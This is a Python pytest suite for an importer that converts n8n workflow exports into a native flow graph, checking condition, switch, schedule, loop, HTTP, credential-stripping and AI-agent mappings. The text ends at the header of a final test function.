"""The n8n workflow importer.

The importer's contract, as `app/services/flow_import_n8n.py` states it: every
n8n node lands mapped, mapped-to-review or unresolved; a node that could not be
carried over faithfully keeps its kind and branches but carries review notes
that keep it from running; credentials and literal secrets never cross over;
and a plain n8n data reference becomes a ``{{node.output}}`` reference that the
validator accepts.

The workflows below are small hand-written exports reproducing the parameter
shapes of real ones (n8n's own node fixtures and public template-library
workflows: If v1 / v2, Switch v1 / v3, Set v1 / v3.3, HTTP Request v4, AI Agent
with its sub-nodes, ...). Each test asserts on the converted graph itself.
"""

from __future__ import annotations

import contextlib
import io
import json

import pytest

from app.services.flow_graph import (
    MAX_NODES,
    normalize_graph,
    pending_import_review,
    validate_graph,
)
from app.services.flow_import import (
    FlowImportError,
    detect_format,
    import_flow_document,
)
from app.services.flow_import_n8n import parse_reference

BASE = "n8n-nodes-base."
LC = "@n8n/n8n-nodes-langchain."


def _n(name, node_type, params=None, *, version=1, position=(0, 0), **extra):
    return {
        "id": f"id-{name}",
        "name": name,
        "type": node_type,
        "typeVersion": version,
        "position": list(position),
        "parameters": params or {},
        **extra,
    }


def _main(*outputs):
    """A node's `main` connections: one list of target names per output."""
    return {"main": [[{"node": target, "type": "main", "index": 0} for target in output] for output in outputs]}


def _ai(conn_type, target):
    return {conn_type: [[{"node": target, "type": conn_type, "index": 0}]]}


def _wf(nodes, connections, **extra):
    return {"name": "Imported", "nodes": nodes, "connections": connections, **extra}


def _import(workflow):
    imported = import_flow_document(workflow)
    graph = normalize_graph(imported["graph"])
    return imported, graph


def _node(graph, node_id):
    return next(n for n in graph["nodes"] if n["id"] == node_id)


def _edges(graph):
    return {(e["source"], e["source_handle"], e["target"], e["target_handle"], e["kind"]) for e in graph["edges"]}


def _errors(graph):
    return [i.code for i in validate_graph(graph).issues if i.severity == "error"]


# ── Format detection ─────────────────────────────────────────────────────────


def test_a_bare_n8n_export_is_detected():
    workflow = _wf([_n("Start", BASE + "manualTrigger")], {})
    assert detect_format(workflow) == "n8n"


def test_a_template_library_envelope_is_unwrapped_and_named():
    """`api.n8n.io/api/templates/workflows/<id>` nests the export twice."""
    inner = {"nodes": [_n("Start", BASE + "manualTrigger")], "connections": {}}
    document = {"workflow": {"id": 1, "name": "From the library", "workflow": inner}}
    assert detect_format(document) == "n8n"
    imported, _graph = _import(document)
    assert imported["name"] == "From the library"
    assert imported["report"]["format"] == "n8n"


def test_a_bare_native_graph_is_still_native():
    assert detect_format({"nodes": [], "edges": []}) == "native"


# ── Expression references ───────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("expression", "expected"),
    [
        ("$json.a.b", (None, ["a", "b"])),
        ("$json['a b'].c", (None, ["a b", "c"])),
        ('$json["x"][0]', (None, ["x", "0"])),
        ("$json?.a?.b", (None, ["a", "b"])),
        ("$json.a || ''", (None, ["a"])),
        ('$json.a ?? ""', (None, ["a"])),
        ("JSON.stringify($json.a)", (None, ["a"])),
        ("JSON.stringify($json.a, null, 2)", (None, ["a"])),
        ("$input.first().json.a", (None, ["a"])),
        ("$input.item.json.a", (None, ["a"])),
        ("$('My Node').item.json.a", ("My Node", ["a"])),
        ('$("My Node").first().json.a', ("My Node", ["a"])),
        ("$('It\\'s').last().json.a", ("It's", ["a"])),
        ('$node["My Node"].json.a', ("My Node", ["a"])),
        ('$items("My Node")[0].json.a', ("My Node", ["a"])),
    ],
)
def test_a_plain_reference_is_read(expression, expected):
    assert parse_reference(expression) == expected


@pytest.mark.parametrize(
    "expression",
    [
        "$json.a + 1",
        "$json.items.length",
        "$json.a.toUpperCase()",
        "$now",
        "$('My Node').params.documentId",
        '$json["a.b"]',
        "$json.a || 'fallback'",
        "$json.a ? 1 : 2",
        "$binary.data.fileName",
    ],
)
def test_anything_but_a_plain_reference_is_refused(expression):
    assert parse_reference(expression) is None


# ── Triggers, references and passthroughs ────────────────────────────────────


def _webhook_flow(second_condition=None, combinator="and"):
    conditions = [
        {
            "leftValue": "={{ $json.body.severity }}",
            "rightValue": "high",
            "operator": {"type": "string", "operation": "equals"},
        }
    ]
    if second_condition:
        conditions.append(second_condition)
    return _wf(
        [
            _n(
                "Webhook",
                BASE + "webhook",
                {"path": "incident-created", "httpMethod": "POST"},
                version=2,
            ),
            _n(
                "Is High",
                BASE + "if",
                {"conditions": {"conditions": conditions, "combinator": combinator}},
                version=2.2,
            ),
            _n(
                "Notify",
                BASE + "emailSend",
                {
                    "toEmail": "soc@example.com",
                    "subject": "Incident",
                    "text": "=Severity {{ $json.body.severity }} from {{ $('Webhook').item.json.headers['x-source'] }}",
                },
                version=2.1,
            ),
            _n("Ignore", BASE + "noOp"),
        ],
        {"Webhook": _main(["Is High"]), "Is High": _main(["Notify"], ["Ignore"])},
    )


def test_a_webhook_if_email_workflow_converts_to_a_valid_flow():
    imported, graph = _import(_webhook_flow())

    kinds = {n["id"]: n["kind"] for n in graph["nodes"]}
    assert kinds == {
        "webhook": "trigger.webhook",
        "is_high": "condition.if",
        "notify": "action.send_message",
        "ignore": "util.reroute",
    }
    assert _node(graph, "webhook")["config"] == {"path": "incident-created"}
    assert _node(graph, "is_high")["config"] == {
        "left": "{{webhook.payload.severity}}",
        "operator": "equals",
        "right": "high",
    }
    # `$json` behind the If reads the If's own input: n8n's If passes items on.
    assert _node(graph, "notify")["config"] == {
        "channel": "email",
        "target": "soc@example.com",
        "message": "Severity {{webhook.payload.severity}} from {{webhook.headers.x-source}}",
    }
    assert _edges(graph) == {
        ("webhook", "out", "is_high", "in", "data"),
        ("is_high", "true", "notify", "in", "condition_branch"),
        ("is_high", "false", "ignore", "in", "condition_branch"),
    }
    assert imported["report"]["nodes_to_review"] == 0
    assert imported["report"]["edges_dropped"] == 0
    assert _errors(graph) == []


def test_an_and_condition_becomes_a_chain_of_ifs():
    _imported, graph = _import(
        _webhook_flow(
            {
                "leftValue": "={{ $json.body.asset }}",
                "rightValue": "",
                "operator": {"type": "string", "operation": "notEmpty"},
            }
        )
    )
    assert _node(graph, "is_high_2")["config"] == {
        "left": "{{webhook.payload.asset}}",
        "operator": "is_not_empty",
    }
    assert _edges(graph) == {
        ("webhook", "out", "is_high", "in", "data"),
        # Under AND, the first test passing leads to the second ...
        ("is_high", "true", "is_high_2", "in", "condition_branch"),
        ("is_high_2", "true", "notify", "in", "condition_branch"),
        # ... and either failing is the n8n False output.
        ("is_high", "false", "ignore", "in", "condition_branch"),
        ("is_high_2", "false", "ignore", "in", "condition_branch"),
    }
    assert _errors(graph) == []


def test_an_or_condition_chains_on_the_false_branch():
    _imported, graph = _import(
        _webhook_flow(
            {
                "leftValue": "={{ $json.body.asset }}",
                "rightValue": "primary-asset",
                "operator": {"type": "string", "operation": "contains"},
            },
            combinator="or",
        )
    )
    assert _edges(graph) == {
        ("webhook", "out", "is_high", "in", "data"),
        ("is_high", "false", "is_high_2", "in", "condition_branch"),
        ("is_high", "true", "notify", "in", "condition_branch"),
        ("is_high_2", "true", "notify", "in", "condition_branch"),
        ("is_high_2", "false", "ignore", "in", "condition_branch"),
    }


@pytest.mark.parametrize(
    ("operation", "right", "config", "pass_handle"),
    [
        ("startsWith", "CVE-", {"operator": "matches", "right": "^CVE\\-"}, "true"),
        ("notStartsWith", "CVE-", {"operator": "matches", "right": "^CVE\\-"}, "false"),
        ("endsWith", ".exe", {"operator": "matches", "right": "\\.exe$"}, "true"),
        ("notRegex", "^a+$", {"operator": "matches", "right": "^a+$"}, "false"),
        # a >= b is "not a < b": the branches swap.
        ("gte", "7", {"operator": "lt", "right": "7"}, "false"),
        ("lte", "7", {"operator": "gt", "right": "7"}, "false"),
    ],
)
def test_operators_without_a_local_twin_are_rewritten(operation, right, config, pass_handle):
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Check",
                BASE + "if",
                {
                    "conditions": {
                        "conditions": [
                            {
                                "leftValue": "={{ $json.value }}",
                                "rightValue": right,
                                "operator": {"type": "string", "operation": operation},
                            }
                        ]
                    }
                },
                version=2,
            ),
            _n("Yes", BASE + "noOp"),
        ],
        {"Start": _main(["Check"]), "Check": _main(["Yes"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "check")["config"] == {"left": "{{start.payload.value}}", **config}
    assert ("check", pass_handle, "yes", "in", "condition_branch") in _edges(graph)


def test_an_if_v1_condition_block_is_read():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Check",
                BASE + "if",
                {
                    "conditions": {
                        "string": [{"value1": "={{ $json.name }}", "operation": "contains", "value2": "Elon"}]
                    }
                },
            ),
        ],
        {"Start": _main(["Check"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "check")["config"] == {
        "left": "{{start.payload.name}}",
        "operator": "contains",
        "right": "Elon",
    }


def test_a_reference_through_several_inputs_reads_whichever_ran_to_review():
    """n8n reads the item that arrived; a node that did not run renders ""."""
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Route",
                BASE + "if",
                {
                    "conditions": {
                        "conditions": [
                            {
                                "leftValue": "={{ $json.a }}",
                                "rightValue": "x",
                                "operator": {"type": "string", "operation": "equals"},
                            }
                        ]
                    }
                },
                version=2,
            ),
            _n("Left", BASE + "httpRequest", {"url": "https://a.example/"}, version=4.2),
            _n("Right", BASE + "httpRequest", {"url": "https://b.example/"}, version=4.2),
            _n("Report", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $json.id }}"}),
        ],
        {
            "Start": _main(["Route"]),
            "Route": _main(["Left"], ["Right"]),
            "Left": _main(["Report"]),
            "Right": _main(["Report"]),
        },
    )
    _imported, graph = _import(workflow)
    report = _node(graph, "report")
    assert report["config"]["message"] == "{{left.body.id}}{{right.body.id}}"
    # Right when the branches exclude each other, wrong when both run: a human
    # confirms which before the node may run.
    assert pending_import_review(report) == [
        "`$json.id` reads whichever of 2 upstream branches ran; check that they never run together."
    ]
    assert _errors(graph) == []


# ── Untranslatable content: review notes, never a silent change ──────────────


def test_a_javascript_expression_is_kept_inert_and_flagged():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Call",
                BASE + "httpRequest",
                {"url": "=https://api.example/{{ $json.id.toUpperCase() }}"},
                version=4.2,
            ),
        ],
        {"Start": _main(["Call"])},
    )
    imported, graph = _import(workflow)
    call = _node(graph, "call")
    assert call["config"]["url"] == "https://api.example/⟨n8n: $json.id.toUpperCase()⟩"
    assert pending_import_review(call) == [
        "Expression not translated: `$json.id.toUpperCase()` — rewrite it with {{node.output}} references."
    ]
    assert imported["report"]["nodes_to_review"] == 1
    # Kept savable: the marker is not a `{{ }}` reference.
    assert _errors(graph) == []
    codes = [i.code for i in validate_graph(graph).issues if i.node_id == "call"]
    assert codes == ["node.import_review"]


def test_a_reference_into_an_unresolved_node_is_flagged():
    workflow = _wf(
        [
            _n("Base", BASE + "airtable", {"operation": "list"}, version=2.1),
            _n("Mail", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $json.row }}"}),
        ],
        {"Base": _main(["Mail"])},
    )
    imported, graph = _import(workflow)
    assert _node(graph, "base")["kind"] == "unresolved"
    assert _node(graph, "mail")["config"]["message"] == "⟨n8n: $json.row⟩"
    assert pending_import_review(_node(graph, "mail")) == [
        "Reference not translated: `$json.row` (no equivalent for `row` of `Base` (airtable))."
    ]
    assert imported["report"]["nodes_unresolved"] == 1


def test_a_javascript_code_node_keeps_its_wiring_and_waits_for_a_python_rewrite():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("Transform", BASE + "code", {"jsCode": "return items;"}, version=2),
            _n("Next", BASE + "noOp"),
        ],
        {"Start": _main(["Transform"]), "Transform": _main(["Next"])},
    )
    _imported, graph = _import(workflow)
    transform = _node(graph, "transform")
    assert transform["kind"] == "util.code"
    assert transform["source_payload"]["parameters"] == {"jsCode": "return items;"}
    assert len(pending_import_review(transform)) == 1
    assert _edges(graph) == {
        ("start", "out", "transform", "in", "data"),
        ("transform", "out", "next", "in", "data"),
    }


# ── Switch ───────────────────────────────────────────────────────────────────


def _rule(value, key, operation="equals"):
    return {
        "conditions": {
            "conditions": [
                {
                    "leftValue": "={{ $json.kind }}",
                    "rightValue": value,
                    "operator": {"type": "string", "operation": operation},
                }
            ],
            "combinator": "and",
        },
        "renameOutput": True,
        "outputKey": key,
    }


def test_a_switch_on_one_value_becomes_a_switch_node():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Route",
                BASE + "switch",
                {
                    "rules": {"values": [_rule("phishing", "Phish"), _rule("malware", "Malware")]},
                    "options": {"fallbackOutput": "extra"},
                },
                version=3.2,
            ),
            _n("A", BASE + "noOp"),
            _n("B", BASE + "noOp"),
            _n("C", BASE + "noOp"),
        ],
        {"Start": _main(["Route"]), "Route": _main(["A"], ["B"], ["C"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "route")["config"] == {
        "value": "{{start.payload.kind}}",
        "cases": {"Phish": "phishing", "Malware": "malware"},
    }
    assert _edges(graph) == {
        ("start", "out", "route", "in", "data"),
        ("route", "case:Phish", "a", "in", "condition_branch"),
        ("route", "case:Malware", "b", "in", "condition_branch"),
        ("route", "default", "c", "in", "condition_branch"),
    }
    assert _errors(graph) == []


def test_switch_rules_on_other_operators_become_an_if_cascade():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Route",
                BASE + "switch",
                {"rules": {"values": [_rule("CVE", "Vuln", "contains"), _rule("x", "Other")]}},
                version=3,
            ),
            _n("A", BASE + "noOp"),
            _n("B", BASE + "noOp"),
        ],
        {"Start": _main(["Route"]), "Route": _main(["A"], ["B"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "route")["kind"] == "condition.if"
    assert _node(graph, "route_rule_2")["kind"] == "condition.if"
    assert _edges(graph) == {
        ("start", "out", "route", "in", "data"),
        ("route", "true", "a", "in", "condition_branch"),
        ("route", "false", "route_rule_2", "in", "condition_branch"),
        ("route_rule_2", "true", "b", "in", "condition_branch"),
    }


def test_a_switch_v1_routes_rules_to_their_output_index():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Route",
                BASE + "switch",
                {
                    "value1": "={{ $json.data }}",
                    "rules": {
                        "rules": [
                            {"operation": "equal", "value2": 0},
                            {"operation": "equal", "value2": 1, "output": 1},
                        ]
                    },
                    "fallbackOutput": 2,
                },
            ),
            _n("Zero", BASE + "noOp"),
            _n("One", BASE + "noOp"),
            _n("Else", BASE + "noOp"),
        ],
        {"Start": _main(["Route"]), "Route": _main(["Zero"], ["One"], ["Else"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "route")["config"] == {
        "value": "{{start.payload.data}}",
        "cases": {"output 0": "0", "output 1": "1"},
    }
    assert _edges(graph) == {
        ("start", "out", "route", "in", "data"),
        ("route", "case:output 0", "zero", "in", "condition_branch"),
        ("route", "case:output 1", "one", "in", "condition_branch"),
        ("route", "default", "else", "in", "condition_branch"),
    }


# ── Schedules, waits, loops ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("node", "cron"),
    [
        (_n("T", BASE + "scheduleTrigger", {"rule": {"interval": [{}]}}, version=1.2), "0 0 * * *"),
        (
            _n(
                "T",
                BASE + "scheduleTrigger",
                {"rule": {"interval": [{"field": "hours", "hoursInterval": 4, "triggerAtMinute": 15}]}},
                version=1.2,
            ),
            "15 */4 * * *",
        ),
        (
            _n(
                "T",
                BASE + "scheduleTrigger",
                {"rule": {"interval": [{"field": "weeks", "triggerAtDay": [1, 5], "triggerAtHour": 9}]}},
                version=1.2,
            ),
            "0 9 * * 1,5",
        ),
        (
            _n(
                "T",
                BASE + "scheduleTrigger",
                {"rule": {"interval": [{"field": "cronExpression", "expression": "0 30 8 * * 1-5"}]}},
                version=1.2,
            ),
            "30 8 * * 1-5",
        ),
        (
            _n("T", BASE + "cron", {"triggerTimes": {"item": [{"mode": "everyWeek", "hour": 7, "weekday": "3"}]}}),
            "0 7 * * 3",
        ),
    ],
)
def test_schedules_become_cron_expressions(node, cron):
    workflow = _wf([node], {}, settings={"timezone": "Europe/Paris"})
    _imported, graph = _import(workflow)
    assert _node(graph, "t")["config"] == {"cron": cron, "timezone": "Europe/Paris"}


def test_a_seconds_schedule_is_flagged():
    workflow = _wf(
        [
            _n(
                "T",
                BASE + "scheduleTrigger",
                {"rule": {"interval": [{"field": "seconds", "secondsInterval": 10}]}},
                version=1.2,
            )
        ],
        {},
    )
    _imported, graph = _import(workflow)
    assert pending_import_review(_node(graph, "t")) == [
        "n8n fired every 10 seconds; the scheduler's finest step is one minute."
    ]


@pytest.mark.parametrize(
    ("params", "version", "duration"),
    [
        ({"amount": 42, "unit": "seconds"}, 1, "42s"),
        ({"amount": 90, "unit": "minutes"}, 1, "90m"),
        ({"amount": 2, "unit": "hours"}, 1, "2h"),
        ({"amount": 1.5, "unit": "hours"}, 1, "90m"),
        ({"amount": 2, "unit": "days"}, 1, "2d"),
    ],
)
def test_a_wait_becomes_a_delay(params, version, duration):
    _imported, graph = _import(_wf([_n("Pause", BASE + "wait", params, version=version)], {}))
    assert _node(graph, "pause")["config"] == {"duration": duration}


def test_a_wait_resumed_by_a_call_waits_for_an_event_to_review():
    _imported, graph = _import(_wf([_n("Pause", BASE + "wait", {"resume": "webhook"}, version=1.1)], {}))
    assert _node(graph, "pause")["kind"] == "util.wait_event"
    assert len(pending_import_review(_node(graph, "pause"))) == 1


def test_loop_over_items_maps_its_two_outputs_and_keeps_the_back_edge():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("Fetch", BASE + "httpRequest", {"url": "https://api.example/items"}, version=4.2),
            _n("Loop", BASE + "splitInBatches", {"options": {}}, version=3),
            _n("Each", BASE + "httpRequest", {"url": "=https://api.example/{{ $json.id }}"}, version=4.2),
            _n("Done", BASE + "noOp"),
        ],
        {
            "Start": _main(["Fetch"]),
            "Fetch": _main(["Loop"]),
            "Loop": _main(["Done"], ["Each"]),
            "Each": _main(["Loop"]),
        },
    )
    _imported, graph = _import(workflow)
    loop = _node(graph, "loop")
    # What the loop iterates is what reached it from outside its body.
    assert loop["config"] == {"items": "{{fetch.body}}"}
    assert pending_import_review(loop) == [
        "n8n looped over the items it received; check that Items names the list to iterate."
    ]
    assert _node(graph, "each")["config"]["url"] == "https://api.example/{{loop.item.id}}"
    assert _edges(graph) == {
        ("start", "out", "fetch", "in", "data"),
        ("fetch", "out", "loop", "in", "data"),
        ("loop", "done", "done", "in", "data"),
        ("loop", "each", "each", "in", "data"),
        ("each", "out", "loop", "in", "data"),
    }
    assert _errors(graph) == []


# ── Edit Fields (Set) ────────────────────────────────────────────────────────


def _run_generated_code(code, inputs):
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        exec(code, {"inputs": dict(inputs)})  # noqa: S102 - our own generated code
    return json.loads(out.getvalue())


def test_a_set_node_runs_as_code_building_the_same_item():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Fields",
                BASE + "set",
                {
                    "assignments": {
                        "assignments": [
                            {"name": "user.id", "type": "number", "value": "={{ $json.uid }}"},
                            {"name": "active", "type": "boolean", "value": "true"},
                            {"name": "label", "type": "string", "value": "fixed"},
                        ]
                    },
                    "includeOtherFields": True,
                },
                version=3.4,
            ),
        ],
        {"Start": _main(["Fields"])},
    )
    _imported, graph = _import(workflow)
    config = _node(graph, "fields")["config"]
    assert config["inputs"] == {
        "user.id": "{{start.payload.uid}}",
        "active": "true",
        "label": "fixed",
        "_input": "{{start.payload}}",
    }
    # What the walker hands the sandbox once the references are rendered.
    rendered = {"user.id": "42", "active": "true", "label": "fixed", "_input": '{"keep": 1}'}
    assert _run_generated_code(config["code"], rendered) == {
        "keep": 1,
        "user": {"id": 42},
        "active": True,
        "label": "fixed",
    }


def test_a_set_v1_node_is_read():
    workflow = _wf(
        [
            _n(
                "Fields",
                BASE + "set",
                {
                    "values": {"string": [{"name": "s", "value": "foo"}], "number": [{"name": "n", "value": 1}]},
                    "keepOnlySet": True,
                },
            )
        ],
        {},
    )
    _imported, graph = _import(workflow)
    config = _node(graph, "fields")["config"]
    assert config["inputs"] == {"s": "foo", "n": 1}
    assert _run_generated_code(config["code"], config["inputs"]) == {"s": "foo", "n": 1}


# ── HTTP Request, credentials and secrets ────────────────────────────────────


def _http_flow(**params):
    return _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Call",
                BASE + "httpRequest",
                params,
                version=4.2,
                credentials={"httpHeaderAuth": {"id": "cred-123", "name": "Prod key"}},
            ),
        ],
        {"Start": _main(["Call"])},
    )


def test_an_http_request_v4_is_translated():
    _imported, graph = _import(
        _http_flow(
            method="POST",
            url="https://api.example/v1/search",
            sendQuery=True,
            queryParameters={"parameters": [{"name": "q", "value": "a b"}, {"name": "id", "value": "={{ $json.id }}"}]},
            sendHeaders=True,
            headerParameters={"parameters": [{"name": "Accept", "value": "application/json"}]},
            sendBody=True,
            specifyBody="json",
            jsonBody='={ "ioc": "{{ $json.value }}" }',
        )
    )
    assert _node(graph, "call")["config"] == {
        "method": "POST",
        "url": "https://api.example/v1/search?q=a%20b&id={{start.payload.id}}",
        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
        "body": '{ "ioc": "{{start.payload.value}}" }',
    }


def test_credentials_and_literal_secrets_never_cross_over():
    imported, graph = _import(
        _http_flow(
            url="https://api.example/",
            authentication="genericCredentialType",
            genericAuthType="httpHeaderAuth",
            sendHeaders=True,
            headerParameters={"parameters": [{"name": "Authorization", "value": "Bearer s3cr3t-value"}]},
        )
    )
    call = _node(graph, "call")
    assert call["config"]["headers"] == {"Authorization": ""}
    assert pending_import_review(call) == [
        "The literal value of the `Authorization` header was not imported: "
        "store it as a secret variable and reference it.",
        "n8n authenticated this request with `httpHeaderAuth` credentials, "
        "which are never imported: add the header from a secret variable.",
    ]
    serialized = json.dumps(imported)
    for leaked in ("s3cr3t-value", "cred-123", "Prod key"):
        assert leaked not in serialized
    assert imported["report"]["warnings"][:2] == [
        "1 nodes used n8n credentials (httpHeaderAuth). Credentials are never "
        "imported: configure the matching XTM One integration, secret variable "
        "or channel.",
        "1 literal secret values (API keys, passwords, authorization headers) "
        "were removed from the imported parameters. Store them as secret "
        "variables.",
    ]


# ── AI agents ────────────────────────────────────────────────────────────────


def _agent_flow():
    return _wf(
        [
            _n("Chat", LC + "chatTrigger", {"options": {}}, version=1.1),
            _n(
                "Agent",
                LC + "agent",
                {"options": {"systemMessage": "You triage alerts.", "maxIterations": 12}},
                version=2,
            ),
            _n(
                "Model",
                LC + "lmChatOpenAi",
                {"model": {"__rl": True, "value": "gpt-4o-mini"}, "options": {"temperature": 0.2}},
                version=1.2,
            ),
            _n("Memory", LC + "memoryBufferWindow", {"contextWindowLength": 7}, version=1.3),
            _n("Search", LC + "toolHttpRequest", {"url": "https://api.example"}, version=1.1),
            _n(
                "Parser",
                LC + "outputParserStructured",
                {"jsonSchemaExample": '{"verdict": "malicious", "score": 7}'},
                version=1.2,
            ),
            _n("Alert", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $json.output.verdict }}"}),
        ],
        {
            "Chat": _main(["Agent"]),
            "Agent": _main(["Alert"]),
            "Model": _ai("ai_languageModel", "Agent"),
            "Memory": _ai("ai_memory", "Agent"),
            "Search": _ai("ai_tool", "Agent"),
            "Parser": _ai("ai_outputParser", "Agent"),
        },
    )


def test_an_ai_agent_and_its_sub_nodes_become_an_agent_with_capabilities():
    imported, graph = _import(_agent_flow())
    agent = _node(graph, "agent")
    assert agent["kind"] == "agent"
    assert agent["config"] == {
        # n8n's default prompt is the chat input.
        "prompt": "{{chat.message}}",
        "persona_override": "You triage alerts.",
        "max_iterations": 12,
        # Folded from the chat model sub-node.
        "temperature": 0.2,
        # A Chat start point leads here, as wiring one in the builder does.
        "chat_enabled": True,
    }
    assert {n["id"]: n["kind"] for n in graph["nodes"] if n["kind"].startswith("capability.")} == {
        "memory": "capability.memory",
        "search": "capability.tool",
        "parser": "capability.structured_output",
    }
    assert _node(graph, "parser")["config"] == {
        "schema": {
            "type": "object",
            "properties": {"verdict": {"type": "string"}, "score": {"type": "number"}},
            "required": ["verdict", "score"],
        }
    }
    # The structured answer is read through a Break node behind the agent.
    assert _node(graph, "agent_fields")["config"] == {"value": "{{agent.output}}"}
    assert _node(graph, "alert")["config"]["message"] == "{{agent_fields.fields.verdict}}"
    assert _edges(graph) == {
        ("chat", "out", "agent", "in", "data"),
        ("memory", "provides", "agent", "memory", "capability"),
        ("search", "provides", "agent", "tools", "capability"),
        ("parser", "provides", "agent", "output", "capability"),
        ("agent", "out", "agent_fields", "in", "data"),
        ("agent_fields", "out", "alert", "in", "data"),
    }
    # The model is folded, not a node of its own.
    assert "model" not in {n["id"] for n in graph["nodes"]}
    assert imported["report"]["warnings"] == [
        "1 AI sub-nodes (chat models, embeddings, document loaders, text "
        "splitters) were folded into the node they served.",
        "n8n runs each node once per item; XTM One passes one value from step "
        "to step. Where the workflow handled lists, iterate them with a Loop node.",
    ]
    assert _errors(graph) == []


def test_a_text_classifier_becomes_an_llm_switch_with_its_model_wired():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Classify",
                LC + "textClassifier",
                {
                    "inputText": "={{ $json.text }}",
                    "categories": {
                        "categories": [
                            {"category": "phishing", "description": "A lure asking for credentials"},
                            {"category": "spam", "description": "Unsolicited bulk mail"},
                        ]
                    },
                    "options": {"fallback": "other"},
                },
                version=1.1,
            ),
            _n("Model", LC + "lmChatOpenAi", {"model": "gpt-4o"}, version=1),
            _n("P", BASE + "noOp"),
            _n("S", BASE + "noOp"),
            _n("O", BASE + "noOp"),
        ],
        {
            "Start": _main(["Classify"]),
            "Classify": _main(["P"], ["S"], ["O"]),
            "Model": _ai("ai_languageModel", "Classify"),
        },
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "classify")["config"] == {
        "value": "{{start.payload.text}}",
        "cases": {
            "phishing": "A lure asking for credentials",
            "spam": "Unsolicited bulk mail",
        },
    }
    assert _node(graph, "model")["kind"] == "capability.llm"
    assert _edges(graph) == {
        ("start", "out", "classify", "in", "data"),
        ("model", "provides", "classify", "llm", "capability"),
        ("classify", "case:phishing", "p", "in", "condition_branch"),
        ("classify", "case:spam", "s", "in", "condition_branch"),
        ("classify", "default", "o", "in", "condition_branch"),
    }
    assert pending_import_review(_node(graph, "classify")) == []


def test_a_text_classifier_without_its_model_is_flagged():
    workflow = _wf(
        [_n("Classify", LC + "textClassifier", {"inputText": "x", "categories": {"categories": [{"category": "a"}]}})],
        {},
    )
    _imported, graph = _import(workflow)
    assert pending_import_review(_node(graph, "classify")) == [
        "n8n classified with a chat model that did not come across: wire an LLM node into this switch."
    ]


# ── Node settings ────────────────────────────────────────────────────────────


def test_an_error_output_becomes_the_error_port():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Call",
                BASE + "httpRequest",
                {"url": "https://api.example/"},
                version=4.2,
                onError="continueErrorOutput",
            ),
            _n("Ok", BASE + "noOp"),
            _n("Failed", BASE + "noOp"),
        ],
        {"Start": _main(["Call"]), "Call": _main(["Ok"], ["Failed"])},
    )
    _imported, graph = _import(workflow)
    assert _edges(graph) == {
        ("start", "out", "call", "in", "data"),
        ("call", "out", "ok", "in", "data"),
        ("call", "error", "failed", "in", "error"),
    }


def test_continue_on_the_regular_output_wires_the_error_path_there_too():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n(
                "Call",
                BASE + "httpRequest",
                {"url": "https://api.example/"},
                version=4.2,
                onError="continueRegularOutput",
            ),
            _n("Next", BASE + "noOp"),
        ],
        {"Start": _main(["Call"]), "Call": _main(["Next"])},
    )
    _imported, graph = _import(workflow)
    assert _edges(graph) == {
        ("start", "out", "call", "in", "data"),
        ("call", "out", "next", "in", "data"),
        ("call", "error", "next", "in", "error"),
    }


def test_a_disabled_node_passes_its_input_through():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("Call", BASE + "httpRequest", {"url": "https://api.example/"}, version=4.2, disabled=True),
        ],
        {"Start": _main(["Call"])},
    )
    _imported, graph = _import(workflow)
    call = _node(graph, "call")
    assert call["kind"] == "util.reroute"
    assert call["source_payload"]["parameters"] == {"url": "https://api.example/"}


def test_a_node_named_after_a_reserved_prefix_gets_another_id():
    """`{{trigger.*}}` is the assignment renderer's: a node may not be `trigger`."""
    _imported, graph = _import(_wf([_n("Trigger", BASE + "manualTrigger")], {}))
    assert [n["id"] for n in graph["nodes"]] == ["trigger_node"]


def test_the_layout_is_spread_so_nodes_do_not_overlap():
    """n8n's sub-nodes sit 120 apart; an XTM One node is about 240 wide."""
    workflow = _agent_flow()
    for node in workflow["nodes"]:
        node["position"] = {
            "Chat": [0, 0],
            "Agent": [240, 0],
            "Model": [200, 220],
            "Memory": [320, 220],
            "Search": [440, 220],
            "Parser": [560, 220],
            "Alert": [480, 0],
        }[node["name"]]
    _imported, graph = _import(workflow)
    xy = {n["id"]: (n["position"]["x"], n["position"]["y"]) for n in graph["nodes"]}
    # Scaled 1.5x.
    assert xy["chat"] == (0, 0)
    assert xy["agent"] == (360, 0)
    # One row of capability nodes, pushed 280 apart from the first.
    assert [xy[k] for k in ("memory", "search", "parser")] == [(480, 330), (760, 330), (1040, 330)]


def test_a_sticky_note_becomes_a_note():
    _imported, graph = _import(_wf([_n("Sticky", BASE + "stickyNote", {"content": "## Setup\nAdd a key"})], {}))
    assert _node(graph, "sticky")["kind"] == "util.note"
    assert _node(graph, "sticky")["config"] == {"text": "## Setup\nAdd a key"}


def test_a_workflow_over_the_node_cap_is_refused():
